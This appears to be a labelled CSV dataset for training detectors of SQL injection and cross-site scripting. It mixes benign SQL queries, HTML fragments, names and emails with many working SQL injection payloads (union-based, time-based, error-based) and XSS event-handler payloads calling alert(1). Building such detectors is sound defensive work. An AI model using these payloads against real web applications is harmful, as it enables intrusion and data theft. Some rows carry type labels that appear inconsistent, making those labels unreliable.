Text,Label,type
1  )   as cinw where 3732  =  3732 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
SELECT * FROM anyway WHERE master = 'title',0,sql
tejeda y segoyuela,0,sql
"<li><a href=""/wiki/Glossary_of_civil_engineering"" title=""Glossary of civil engineering"">Civil engineering </a> </li>",0,xss
"c/ padre ignacio ellaguria, 117 6-e",0,sql
7.13661E+15,0,sql
-2781   )    )     )   or 2573  =  5848--,1,sql
SELECT tower ( s )  FROM sometime UNION,0,sql
"<applet draggable=""true"" ondrag=""alert(1)"">test</applet>",2,xss
5229,0,sql
"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'lxoc'  =  'lxoc",1,sql
</dl>,0,xss
"<li id=""cite_note-395""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-395"">^ </a> </b> ",0,xss
"<nextid onclick=""alert(1)"">test</nextid>",2,xss
"   SELECT loud, fair+ ', ' + familiar+ ' ' + lunch+ ', ' + fence AS captured  FROM organized",0,sql
"-4955%' union all select 5928,5928--",1,sql
"1%""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""%""  =  """,1,sql
SELECT breathing ( s )  FROM blood UNION,0,xss
"          <dd><a href=""/en/0.24/"">0.24</a></dd>",0,xss
28815,0,xss
<video id=x tabindex=1 ondeactivate=alert(1)></video><input id=y autofocus>,2,xss
	 </span>,0,xss
SELECT AVG ( war ) FROM layers SELECT SUM ( men ) ,0,sql
SELECT water ( s )  FROM conversation UNION ALL,0,sql
5.82525E+15,0,sql
<nav onfocusout=alert(1) tabindex=1 id=x></nav><input autofocus>,2,xss
"1   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   8965  =  8965",1,sql
frerichs@underdog.as,0,xss
SELECT AVG ( Price ) FROM kind,0,sql
SELECT * FROM all WHERE paint BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"1  )   union all select null,null,null--",1,sql
"-4031%"" union all select 9566--",1,sql
nimia,0,sql
"<li><a href=""/wiki/Philosophy_of_social_science"" title=""Philosophy of social science"">Social science </a> </li>",0,xss
"-7126'   )    )    as fzpp where 8078  =  8078 union all select 8078,8078,8078,8078,8078,8078,8078#",1,sql
-4644 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  # upwd,1,sql
"-7860'   )    )     )   union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",1,sql
admin'  )   or '1'  =  '1,1,sql
"1""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""yopd"" like ""yopd",1,sql
"1   )    )    union all select null,null,null,null,null,null,null#",1,sql
"1'   )    )    as ewsw where 4667  =  4667 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,sql
32,0,sql
"1'   )    )    union all select null,null,null,null,null,null,null#",1,sql
malia,0,sql
"  SELECT * FROM any WHERE new IN  ( 'wait', 'lion', 'planet' )  ",0,sql
SELECT * FROM tribe 3 SELECT * FROM per,0,sql
SELECT * FROM  ( SELECT unit FROM driving ) ,0,sql
hollywood.hausman@921.th,0,sql
-1300  )   as rrsm where 1086  =  1086 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,sql
<aside id=x tabindex=1 onfocusin=alert(1)></aside>,2,xss
"1""   )    )    as fhlg where 1004  =  1004 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1,sql
1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,1,sql
"	 </span>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2Fs10676-007-9138-2"">10.1007/s10676-007-9138-2 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Ethics+and+Information+Technology&amp;rft.atitle=AI+armageddon+and+the+three+laws+of+robotics&amp;rft.volume=9&amp;rft.issue=2&amp;rft.pages=153-164&amp;rft.date=2007&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.85.8904&amp;rft_id=info%3Adoi%2F10.1007%2Fs10676-007-9138-2&amp;rft.aulast=McCauley&amp;rft.aufirst=Lee&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<style>:target {color:red;}</style><spacer id=x style=""transition:color 1s"" ontransitionend=alert(1)></spacer>",2,xss
SELECT COUNT ( familiar )  FROM satisfied,0,sql
"<shadow onmouseover=""alert(1)"">test</shadow>",2,xss
"<li><a href=""/wiki/Laws_of_robotics"" title=""Laws of robotics"">Laws </a> </li>",0,xss
"<map onpaste=""alert(1)"" contenteditable>test</map>",2,xss
SELECT * FROM degree ORDER BY book DESC,0,sql
"	 </span> <span class=""reference-text"">",0,xss
SELECT engine FROM began UNION ALL SELECT jet FROM chamber ORDER BY log,0,sql
SELECT * FROM slightly FETCH FIRST 3 ROWS ONLY,0,sql
<template onblur=alert(1) tabindex=1 id=x></template><input autofocus>,2,xss
"	 <div id=""Computable_knowledge"" style=""font-size:114%;margin:0 4em"">Computable knowledge </div> </th> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Topics and<br />concepts </th><td class=""navbox-list navbox-odd hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
"1 union all select null,null,null--",1,sql
SELECT * FROM cost 3 SELECT * FROM nor,0,sql
"<object onkeypress=""alert(1)"" contenteditable>test</object>",2,xss
SELECT smooth ( s )  FROM sugar UNION,0,sql
5.25793E+15,0,sql
"<dt><a class=""reference internal"" href=""topics/practices.html""><span class=""doc"">Common Practices",0,xss
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_parent  =  27990 AND  ( wp_posts.post_mime_type LIKE 'image/%' )  AND wp_posts.post_type  =  'attachment' AND   (  (  wp_posts.post_status  =  'inherit'  )  )   ORDER BY wp_posts.menu_order ASC LIMIT 0, 1",0,sql
"1   )    )    union all select null,null,null#",1,sql
"  SELECT * FROM consonant WHERE follow IN  ( 'opinion', 'copy', 'lunch' )  ",0,sql
"calle gardenia, 35",0,sql
5.65818E+15,0,sql
SELECT TOP 3 * FROM pony WHERE getting = 'life' SELECT * FROM ate,0,xss
"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",1,sql
"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1,sql
	 </span> 2019 ,0,xss
	 </span></a></dt><dd>Convenient classes to extract links to follow from pages.</dd>,0,xss
"1%'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",1,sql
"1%'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  '%'  =  '",1,sql
tobar,0,sql
1'+  (  select tart where 9861  =  9861,1,sql
"<q onkeydown=""alert(1)"" contenteditable>test</q>",2,xss
lenya@fbi-criminal-network.com.mil,0,sql
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367577 ) ,0,sql
"<li><cite id=""CITEREFMcCorduck2004"" class=""citation""><a href=""/wiki/Pamela_McCorduck"" title=""Pamela McCorduck"">McCorduck, Pamela </a> (2004), <a rel=""nofollow"" class=""external text"" href=""http://www.pamelamc.com/html/machines_who_think.html""><i>Machines Who Think </i> </a> (2nd ed.), Natick, MA: A. K. Peters, Ltd., <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/1-56881-205-1"" title=""Special:BookSources/1-56881-205-1""><bdi>1-56881-205-1 </bdi> </a> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Machines+Who+Think&amp;rft.place=Natick%2C+MA&amp;rft.edition=2nd&amp;rft.pub=A.+K.+Peters%2C+Ltd.&amp;rft.date=2004&amp;rft.isbn=1-56881-205-1&amp;rft.aulast=McCorduck&amp;rft.aufirst=Pamela&amp;rft_id=http%3A%2F%2Fwww.pamelamc.com%2Fhtml%2Fmachines_who_think.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"-1755%' union all select 2615,2615,2615,2615,2615,2615#",1,sql
<td id=x tabindex=1 ondeactivate=alert(1)></td><input id=y autofocus>,2,xss
¼script¾alert(¢¢)¼/script¾,2,xss
SELECT * FROM  ( SELECT almost FROM rabbit ) ,0,xss
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;133–150, </li>",0,xss
SELECT TOP 3 * FROM made WHERE scientist = 'daughter' SELECT * FROM list,0,xss
SELECT * FROM  ( SELECT art FROM most ) ,0,xss
torre-pacheco,0,sql
"1""   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
champ,0,sql
SELECT * FROM softly WHERE correctly LIKE '%luck%',0,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/api.html"">Core API</a></li>",0,xss
"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>",2,xss
"<li><a href=""/wiki/Image_compression"" title=""Image compression"">Image compression </a> </li>",0,xss
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1,xss
swinton@voragolive.kz,0,sql
<a id=x tabindex=1 onfocus=alert(1)></a>,2,xss
"<title draggable=""true"" ondragenter=""alert(1)"">test</title>",2,xss
"1   )    )    as npdl where 5796  =  5796 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,xss
montorns de segarra,0,sql
SELECT * FROM below WHERE tonight = 'sick'  AND  ( year = 'labor' OR she = 'too' ) ,0,sql
SELECT TOP 50 PERCENT * FROM cook,0,sql
"<li><a href=""/wiki/Computability_theory"" title=""Computability theory"">Computability theory </a> </li>",0,xss
nolay,0,sql
cap!tar,0,sql
SELECT entire,0,sql
#NAME?,0,sql
1856,0,sql
inconse_cuente,0,sql
"<div draggable=""true"" contenteditable>drag me</div><menu ondragover=alert(1) contenteditable>drop here</menu>",2,xss
busoms redolad,0,sql
"<big onmouseenter=""alert(1)"">test</big>",2,xss
chuanhsi,0,sql
"1""   )    )    as phis where 4420  =  4420 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'lajk'  =  'lajk,1,sql
SELECT * FROM Products;,0,sql
SELECT * FROM stairs WHERE slow = 'real'  OR shadow = 'cry',0,sql
DELETE FROM section WHERE underline = 'shoot',0,sql
"1"" where 3990  =  3990 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,sql
frison@barnizultravioleta.jm,0,sql
"<tt onmouseleave=""alert(1)"">test</tt>",2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"<style>@keyframes x{}</style><hgroup style=""animation-name:x"" onanimationstart=""alert(1)""></hgroup>",2,xss
"1""   )    )    as zval where 2255  =  2255 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1,sql
8328,0,xss
"<p>Historically, projects such as the Cyc knowledge base (1984–) and the massive Japanese <a href=""/wiki/Fifth_generation_computer"" title=""Fifth generation computer"">Fifth Generation Computer Systems </a> initiative (1982–1992) attempted to cover the breadth of human cognition. These early projects failed to escape the limitations of non-quantitative symbolic logic models and, in retrospect, greatly underestimated the difficulty of cross-domain AI. Nowadays, the vast majority of current AI researchers work instead on tractable ""narrow AI"" applications (such as medical diagnosis or automobile navigation).<sup id=""cite_ref-contemporary_agi_146-0"" class=""reference""><a href=""#cite_note-contemporary_agi-146"">&#91;143&#93; </a> </sup> Many researchers predict that such ""narrow AI"" work in different individual domains will eventually be incorporated into a machine with <a href=""/wiki/Artificial_general_intelligence"" title=""Artificial general intelligence"">artificial general intelligence </a> (AGI), combining most of the narrow skills mentioned in this article and at some point even exceeding human ability in most or all these areas.<sup id=""cite_ref-General_intelligence_19-1"" class=""reference""><a href=""#cite_note-General_intelligence-19"">&#91;19&#93; </a> </sup>",0,xss
SELECT plane FROM equipment UNION ALL SELECT but FROM contrast ORDER BY birds,0,xss
leda,0,sql
65904927z,0,sql
"<blockquote draggable=""true"" ondragend=""alert(1)"">test</blockquote>",2,xss
"<strong draggable=""true"" ondragleave=""alert(1)"">test</strong>",2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
SELECT TOP 3 * FROM appropriate WHERE active = 'series' SELECT * FROM event,0,xss
"<div draggable=""true"" contenteditable>drag me</div><noframes ondrop=alert(1) contenteditable>drop here</noframes>",2,xss
SELECT COUNT ( married ) FROM tall,0,sql
"	 </span> <span class=""reference-text"">Anderson, Susan Leigh. ""Asimov's ""three laws of robotics"" and machine metaethics."" AI &amp; Society 22.4 (2008): 477–493. ",0,xss
norberto,0,xss
"1'   )    )     )   union all select null,null,null,null,null,null,null#",1,sql
-5299 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1,sql
SELECT * FROM rubber FETCH FIRST 3 ROWS ONLY,0,xss
<svg><aside onload=alert(1)></aside>,2,xss
SELECT * FROM notice WHERE exact BETWEEN '1996-07-01' AND '1996-07-31',0,sql
<abbr onpointermove=alert(1)>XSS</abbr>,2,xss
<figure onpointerdown=alert(1)>XSS</figure>,2,xss
"-4015'||  (  select 'qeqv' from dual where 1437  =  1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#",1,sql
91553356q,0,sql
"          <dd><a href=""//docs.scrapy.org/_/downloads/en/latest/epub/"">epub</a></dd>       ",0,xss
SELECT AVG ( apartment ) FROM thy,0,sql
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""azzv"" like ""azzv",1,sql
"SELECT * FROM announced WHERE lesson BETWEEN ""sometime"" AND    ""habit""",0,sql
<q id=x tabindex=1 onfocus=alert(1)></q>,2,xss
"-9295   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  8752  =  8752",1,sql
"1""  )   union all select null,null,null,null,null#",1,sql
SELECT * FROM fly FETCH FIRST 3 ROWS ONLY,0,sql
"  SELECT immediatelyID AS ID, substance AS thin FROM harder",0,xss
leuco vilca,0,xss
offers,0,sql
	 </span>(1879) </li>,0,xss
" SELECT * FROM correct ORDER BY clothing, leader",0,sql
"1""  )   as ufai where 9673  =  9673",1,sql
" </tr><tr><td style=""text-align:right;font-size:115%"">",0,xss
SELECT * FROM other,0,sql
"            <div id=""p-views"" role=""navigation"" class=""vectorTabs "" aria-labelledby=""p-views-label"">",0,xss
"<base onkeypress=""alert(1)"" contenteditable>test</base>",2,xss
"<rp onkeypress=""alert(1)"" contenteditable>test</rp>",2,xss
SELECT * FROM strange WHERE theory IN  ( SELECT engineer FROM slave ) ,0,sql
<br id=x tabindex=1 onbeforedeactivate=alert(1)></br><input autofocus>,2,xss
"<frame onbeforecopy=""alert(1)"" contenteditable>test</frame>",2,xss
"<div draggable=""true"" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>",2,xss
"-2860""   )    )    order by 1#",1,sql
413f1go,0,sql
"<style onmouseup=""alert(1)"">test</style>",2,xss
"  SELECT fewID AS ID, office AS massage FROM mark",0,sql
1'  )   and   (  3020  =  3020  )  *6703 and   (  'botl' like 'botl,1,xss
<content onpointerup=alert(1)>XSS</content>,2,xss
"1  )   where 7425  =  7425 union all select null,null,null,null,null,null,null,null,null,null--",1,sql
SELECT AVG ( they ) FROM bone,0,sql
SELECT * FROM important WHERE habit = 'parent',0,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/deploy.html"">Deploying Spiders</a></li>",0,xss
"<datalist draggable=""true"" ondrag=""alert(1)"">test</datalist>",2,xss
"<multicol onmouseover=""alert(1)"">test</multicol>",2,xss
"<sup onmouseout=""alert(1)"">test</sup>",2,xss
SELECT AVG ( rocket )  FROM scientist  SELECT SUM ( gently ) ,0,sql
"<div oncopy=""alert(1)"" contenteditable>test</div>",2,xss
terry@mtos.ar,0,sql
abraham,0,xss
"SELECT LENGTH ( ""SQL Tutorial"" )  AS LengthOfString;",0,sql
"  SELECT brown AS promised, ready AS [hardly]  FROM something",0,sql
"-6292  )   union all select 7499,7499,7499,7499,7499,7499,7499--",1,sql
"1""   )    )    as nwnp where 6140  =  6140",1,sql
<small id=x tabindex=1 onfocus=alert(1)></small>,2,xss
"  SELECT ourselvesID AS ID, table AS call FROM branch",0,sql
"-3852'  )   union all select 3577,3577,3577,3577,3577,3577,3577,3577#",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"<nobr onbeforepaste=""alert(1)"" contenteditable>test</nobr>",2,xss
"<li id=""cite_note-SCHMID1992-265""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-SCHMID1992_265-0"">^ </a> </b> ",0,xss
<label onpointerover=alert(1)>XSS</label>,2,xss
"<style>@keyframes x{}</style><picture style=""animation-name:x"" onanimationend=""alert(1)""></picture>",2,xss
